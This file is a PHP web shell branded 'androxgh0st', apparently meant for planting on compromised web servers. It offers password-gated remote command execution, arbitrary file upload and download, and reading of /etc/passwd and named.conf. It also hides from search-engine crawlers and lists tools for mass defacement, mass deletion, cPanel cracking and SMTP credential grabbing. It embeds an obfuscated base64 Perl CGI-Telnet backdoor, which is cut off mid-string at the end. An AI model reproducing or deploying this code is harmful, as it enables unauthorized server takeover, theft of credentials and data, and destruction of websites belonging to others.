<?php
session_start();
error_reporting(1);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',1);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 1);
if (version_compare(PHP_VERSION, '7', '<')) {
    @set_magic_quotes_runtime(0);
}

$auth_pass = "7b4939a8af28c814f0c757bb10f40d3d"; // default: androxgh0st
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<html>
<head>
<title>androxgh0st</title>
<font color="white">
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
	color: green;
	text-align: center;
}
header {
	color: green;
	margin: 10px auto;
}
input[type=password] {
	width: 250px;
	height: 25px;
	color: red;
	background: #000000;
	border: 1px dotted green;
	padding: 5px;
	margin-left: 20px;
	text-align: center;
}
</style>
</head>
<center>
<header>
	<pre>
 ___________________________
< root@androxgh0st:~# w00t??? >
 ---------------------------
   \         ,        ,
    \       /(        )`
     \      \ \___   / |
            /- _  `-/  '
           (/\/ \ \   /\
           / /   | `    \
           O O   ) /    |
           `-^--'`<     '
          (_.)  _  )   /
           `.___/`    /
             `-----' /
<----.     __ / __   \
<----|====O)))==) \) /====
<----'    `--' `.__,' \
             |        |
              \       /
        ______( (_  / \______
      ,'  ,-----'   |        \
      `--{__________)        \/

	</pre>
</header>
<form method="post">
<input type="password" name="pass">
</form>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html>
<head>
<title>androxgh0st</title>
<meta name='author' content='androxgh0st'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background: #000000;
    color: #ffffff;
    font-family: 'Ubuntu';
	font-size: 14px;
	width: 100%;
}
pre {
	font-size: 13px;
}
li {
	display: inline;
	margin: 5px;
	padding: 5px;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
}
.table_home, .th_home, .td_home {
	border: 1px solid #ffffff;
}
th {
	padding: 10px;
}
a {
	color: #ffffff;
	text-decoration: none;
}
a:hover {
	color: gold;
	text-decoration: underline;
}
b {
	color: gold;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Ubuntu';
	font-size: 13px;
}
select {
	width: 152px;
	background: #000000; 
	color: lime; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
option:hover {
	background: lime;
	color: #000000;
}
</style>
</head>
<?php
###############################################################################
// Thanks buat Orang-orang yg membantu dalam proses pembuatan shell ini.
// Shell ini tidak sepenuhnya 100% Coding manual, ada beberapa function dan tools kita ambil dari shell yang sudah ada.
// Tapi Selebihnya, itu hasil kreasi androxgh0st sendiri.
// Tanpa kalian kita tidak akan BESAR seperti sekarang.
// Greetz: All Member androxgh0st. & all my friends.
###############################################################################
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function getsource($url) {
    $curl = curl_init($url);
    		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
    		curl_close($curl);
    return $content;
}
function bing($dork) {
	$npage = 1;
	$npages = 30000;
	$allLinks = array();
	$lll = array();
	while($npage <= $npages) {
	    $x = getsource("http://www.bing.com/search?q=".$dork."&first=".$npage);
	    if($x) {
			preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
			foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
			$npage = $npage + 10;
			if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
		} else break;
	}
	$URLs = array();
	foreach($allLinks as $url){
	    $exp = explode("/", $url);
	    $URLs[] = $exp[2];
	}
	$array = array_filter($URLs);
	$array = array_unique($array);
 	$sss = count(array_unique($array));
	foreach($array as $domain) {
		echo $domain."\n";
	}
}
function reverse($url) {
	$ch = curl_init("http://domains.yougetsignal.com/domains.php");
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
		  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
		  curl_setopt($ch, CURLOPT_HEADER, 0);
		  curl_setopt($ch, CURLOPT_POST, 1);
	$resp = curl_exec($ch);
	$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
	$array = explode(",,", $resp);
	unset($array[0]);
	foreach($array as $lnk) {
		$lnk = "http://$lnk";
		$lnk = str_replace(",", "", $lnk);
		echo $lnk."\n";
		ob_flush();
		flush();
	}
		curl_close($ch);
}
if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
	$_COOKIE = idx_ss($_COOKIE);
}

if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}


$d0mains = @file("/etc/named.conf");
$users=@file('/etc/passwd');
if($d0mains) {
	$count;
	foreach($d0mains as $d0main) {
		if(preg_match("/zone/i",$d0main)) {
			preg_match_all('#zone "(.*)"#', $d0main, $domains);
			flush();
			if(strlen(trim($domains[1][0])) > 2) {
				flush();
				$count++;
			}
		}
	}
}

$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "<pre>";
echo "SYSTEM      : <font color=lime>".$kernel."</font><br>";
echo "UID / GID   : <font color=lime>".$user."</font> (".$uid.") / <font color=lime>".$group."</font> (".$gid.")<br>";
echo "SERVER IP   : <font color=lime>".$ip."</font><br>";
echo "HDD         : <font color=lime>$used</font> / <font color=lime>$total</font> ( Free: <font color=lime>$freespace</font> )<br>";
echo "SAFE MODE   : $sm<br>";
echo "PHP VERSION : <font color=lime>".@phpversion()."</font><br>";
echo "WEBSITES    : <font color=lime>$count</font> Domains<br>";
echo "DISABLE FUNC: $show_ds<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
echo "Current DIR : ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]";
echo "</pre>";
if($_POST['upload']) {
	if($_POST['tipe_upload'] == 'biasa') {
		if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
			$act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
		} else {
			$act = "<font color=red>failed to upload file</font>";
		}
	} else {
		$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
		$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
		if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
			if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
				$act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		} else {
			$act = "<font color=red>failed to upload file</font>";
		}
	}
}
echo "Upload File: $act
<form method='post' enctype='multipart/form-data'>
<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ] 
<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
<input type='file' name='ix_file'>
<input type='submit' value='upload' name='upload'>
</form>";
echo "<form method='post' action='?do=cmd&dir=$dir'>
<font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='cmd' required=''>
<input style='border: none; border-bottom: 1px solid #ffffff;'' class='input' type='submit' name='do_cmd' value='>>'>
</form>";
echo "<hr>";
echo "<center>";
echo "<ul>";
echo "<li>[ <a href='?'>Home</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=mass_deface'>Mass Deface</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=mass_delete'>Mass Delete</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=config2'>Config</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=jumping'>Jumping</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=symlink'>Symlink</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cpanel'>CPanel Crack</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=smtp'>SMTP Grabber</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cgitelnet'>CGI Telnet</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=zoneh'>Zone-H</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=network'>network</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=adminer'>Adminer</a> ]</li><br>";
echo "<li>[ <a href='?dir=$dir&do=jumpmod'>Jumping Backup</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a> ]</li>";
echo "<li>[ <a style='color: red;' href='?logout=true'>Logout</a> ]</li>";
echo "</ul>";
echo "</center>";
echo "<hr>";
if($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
} elseif($_GET['do'] == 'cgitelnet') {
	$cgi_dir = mkdir('androxgh0st_cgi', 0755);
	chdir('androxgh0st_cgi');
	$file_cgi = "cgi.gh0st";
	$memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks\nAddType application/x-httpd-cgi .gh0st\nAddHandler cgi-script .gh0st\nAddHandler cgi-script .gh0st";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQp1c2UgTUlNRTo6QmFzZTY0Ow0KJFZlcnNpb249ICJDR0ktVGVsbmV0IFZlcnNpb24gMS4zIjsNCiRFZGl0UGVyc2lvbj0iPGZvbnQgc3R5bGU9J3RleHQtc2hhZG93OiAwcHggMHB4IDZweCByZ2IoMjU1LCAwLCAwKSwgMHB4IDBweCA1cHggcmdiKDMwMCwgMCwgMCksIDBweCAwcHggNXB4IHJnYigzMDAsIDAsIDApOyBjb2xvcjojZmZmZmZmOyBmb250LXdlaWdodDpib2xkOyc+YjM3NGsgLSBDR0ktVGVsbmV0PC9mb250PiI7DQoNCiRQYXNzd29yZCA9ICJnaDBzdCI7CQkJIyBDaGFuZ2UgdGhpcy4gWW91IHdpbGwgbmVlZCB0byBlbnRlciB0aGlzIHRvIGxvZ2luLg0Kc3ViIElzX1dpbigpew0KCSRvcyA9ICZ0cmltKCRFTlZ7IlNFUlZFUl9TT0ZUV0FSRSJ9KTsNCglpZigkb3MgPX4gbS93aW4vaSl7DQoJCXJldHVybiAxOw0KCX0NCgllbHNlew0KCQlyZXR1cm4gMDsNCgl9DQp9DQokV2luTlQgPSAmSXNfV2luKCk7CQkJCSMgWW91IG5lZWQgdG8gY2hhbmdlIHRoZSB2YWx1ZSBvZiB0aGlzIHRvIDEgaWYNCgkJCQkJCQkJIyB5b3UncmUgcnVubmluZyB0aGlzIHNjcmlwdCBvbiBhIFdpbmRvd3MgTlQNCgkJCQkJCQkJIyBtYWNoaW5lLiBJZiB5b3UncmUgcnVubmluZyBpdCBvbiBVbml4LCB5b3UNCgkJCQkJCQkJIyBjYW4gbGVhdmUgdGhlIHZhbHVlIGFzIGl0IGlzLg0KDQokTlRDbWRTZXAgPSAiJiI7CQkJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRzDQoJCQkJCQkJCSMgaW4gYSBjb21tYW5kIGxpbmUgb24gV2luZG93cyBOVC4NCg0KJFVuaXhDbWRTZXAgPSAiOyI7CQkJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRzDQoJCQkJCQkJCSMgaW4gYSBjb21tYW5kIGxpbmUgb24gVW5peC4NCg0KJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gPSAxMDAwMDsJIyBUaW1lIGluIHNlY29uZHMgYWZ0ZXIgY29tbWFuZHMgd2lsbCBiZSBraWxsZWQNCgkJCQkJCQkJIyBEb24ndCBzZXQgdGhpcyB0byBhIHZlcnkgbGFyZ2UgdmFsdWUuIFRoaXMgaXMNCgkJCQkJCQkJIyB1c2VmdWwgZm9yIGNvbW1hbmRzIHRoYXQgbWF5IGhhbmcgb3IgdGhhdA0KCQkJCQkJCQkjIHRha2UgdmVyeSBsb25nIHRvIGV4ZWN1dGUsIGxpa2UgImZpbmQgLyIuDQoJCQkJCQkJCSMgVGhpcyBpcyB2YWxpZCBvbmx5IG9uIFVuaXggc2VydmVycy4gSXQgaXMNCgkJCQkJCQkJIyBpZ25vcmVkIG9uIE5UIFNlcnZlcnMuDQoNCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkJIyBJZiB0aGlzIGlzIDEsIHRoZW4gZGF0YSBpcyBzZW50IHRvIHRoZQ0KCQkJCQkJCQkjIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQ0KCQkJCQkJCQkjIGl0IGlzIGJ1ZmZlcmVkIGFuZCBzZW5kIHdoZW4gdGhlIGNvbW1hbmQNCgkJCQkJCQkJIyBjb21wbGV0ZXMuIFRoaXMgaXMgdXNlZnVsIGZvciBjb21tYW5kcyBsaWtlDQoJCQkJCQkJCSMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0DQoJCQkJCQkJCSMgaXMgYmVpbmcgZ2VuZXJhdGVkLg0KDQojIERPTidUIENIQU5HRSBBTllUSElORyBCRUxPVyBUSElTIExJTkUgVU5MRVNTIFlPVSBLTk9XIFdIQVQgWU9VJ1JFIERPSU5HICEhDQoNCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOw0KJENtZFB3ZCA9ICgkV2luTlQgPyAiY2QiIDogInB3ZCIpOw0KJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7DQokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOw0KJGNvbHM9IDE1MDsNCiRyb3dzPSAyNjsNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUmVhZHMgdGhlIGlucHV0IHNlbnQgYnkgdGhlIGJyb3dzZXIgYW5kIHBhcnNlcyB0aGUgaW5wdXQgdmFyaWFibGVzLiBJdA0KIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLg0KIyBUaGUgZmlsZW5hbWUgaXMgc3RvcmVkIGluICRpbnsnZid9IGFuZCB0aGUgZGF0YSBpcyBzdG9yZWQgaW4gJGlueydmaWxlZGF0YSd9Lg0KIyBPdGhlciB2YXJpYWJsZXMgY2FuIGJlIGFjY2Vzc2VkIHVzaW5nICRpbnsndmFyJ30sIHdoZXJlIHZhciBpcyB0aGUgbmFtZSBvZg0KIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQ0KIyBzY3JpcHRzLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFJlYWRQYXJzZSANCnsNCglsb2NhbCAoKmluKSA9IEBfIGlmIEBfOw0KCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7DQoJDQoJJE11bHRpcGFydEZvcm1EYXRhID0gJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC87DQoNCglpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJHRVQiKQ0KCXsNCgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQoJfQ0KCWVsc2lmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIlBPU1QiKQ0KCXsNCgkJYmlubW9kZShTVERJTikgaWYgJE11bHRpcGFydEZvcm1EYXRhICYgJFdpbk5UOw0KCQlyZWFkKFNURElOLCAkaW4sICRFTlZ7J0NPTlRFTlRfTEVOR1RIJ30pOw0KCX0NCg0KCSMgaGFuZGxlIGZpbGUgdXBsb2FkIGRhdGENCglpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykNCgl7DQoJCSRCb3VuZGFyeSA9ICctLScuJDE7ICMgcGxlYXNlIHJlZmVyIHRvIFJGQzE4NjcgDQoJCUBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IA0KCQkkSGVhZGVyQm9keSA9ICRsaXN0WzFdOw0KCQkkSGVhZGVyQm9keSA9fiAvXHJcblxyXG58XG5cbi87DQoJCSRIZWFkZXIgPSAkYDsNCgkJJEJvZHkgPSAkJzsNCiAJCSRCb2R5ID1+IHMvXHJcbiQvLzsgIyB0aGUgbGFzdCBcclxuIHdhcyBwdXQgaW4gYnkgTmV0c2NhcGUNCgkJJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7DQoJCSRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsgDQoJCSRpbnsnZid9ID0gJDE7IA0KCQkkaW57J2YnfSA9fiBzL1wiLy9nOw0KCQkkaW57J2YnfSA9fiBzL1xzLy9nOw0KDQoJCSMgcGFyc2UgdHJhaWxlcg0KCQlmb3IoJGk9MjsgJGxpc3RbJGldOyAkaSsrKQ0KCQl7IA0KCQkJJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87DQoJCQkkbGlzdFskaV0gPX4gL1wiKFx3KylcIi87DQoJCQkka2V5ID0gJDE7DQoJCQkkdmFsID0gJCc7DQoJCQkkdmFsID1+IHMvKF4oXHJcblxyXG58XG5cbikpfChcclxuJHxcbiQpLy9nOw0KCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSRpbnska2V5fSA9ICR2YWw7IA0KCQl9DQoJfQ0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQ0KCXsNCgkJQGluID0gc3BsaXQoLyYvLCAkaW4pOw0KCQlmb3JlYWNoICRpICgwIC4uICQjaW4pDQoJCXsNCgkJCSRpblskaV0gPX4gcy9cKy8gL2c7DQoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOw0KCQkJJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsNCgkJCSRpbnska2V5fSAuPSAkdmFsOw0KCQl9DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBQYWdlIEhlYWRlcg0KIyBBcmd1bWVudCAxOiBGb3JtIGl0ZW0gbmFtZSB0byB3aGljaCBmb2N1cyBzaG91bGQgYmUgc2V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRQYWdlSGVhZGVyDQp7DQoJJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7DQoJJEVuY29kZWRDdXJyZW50RGlyID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCglteSAkZGlyID0kQ3VycmVudERpcjsNCgkkZGlyPX4gcy9cXC9cXFxcL2c7DQoJcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7DQoJcHJpbnQgPDxFTkQ7DQo8aHRtbD4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iY29udGVudC10eXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgiPg0KPHRpdGxlPkhhY3N1Z2lhPC90aXRsZT4NCg0KJEh0bWxNZXRhSGVhZGVyDQoNCjwvaGVhZD4NCjxzdHlsZT4NCmJvZHl7DQpmb250OiAxMHB0IFZlcmRhbmE7DQp9DQp0ciB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCmNvbG9yOiAjZmY5OTAwOw0KfQ0KdGQgew0KQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItVE9QOiAgICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7DQpjb2xvcjogIzJCQThFQzsNCmZvbnQ6IDEwcHQgVmVyZGFuYTsNCn0NCg0KdGFibGUgew0KQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItVE9QOiAgICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7DQpCQUNLR1JPVU5ELUNPTE9SOiAjMTExOw0KfQ0KDQoNCmlucHV0IHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KQkFDS0dST1VORC1DT0xPUjogQmxhY2s7DQpmb250OiAxMHB0IFZlcmRhbmE7DQpjb2xvcjogI2ZmOTkwMDsNCn0NCg0KaW5wdXQuc3VibWl0IHsNCnRleHQtc2hhZG93OiAwcHQgMHB0IDAuM2VtIGN5YW4sIDBwdCAwcHQgMC4zZW0gY3lhbjsNCmNvbG9yOiAjRkZGRkZGOw0KYm9yZGVyLWNvbG9yOiAjMDA5OTAwOw0KfQ0KDQpjb2RlIHsNCmJvcmRlcgkJCTogZGFzaG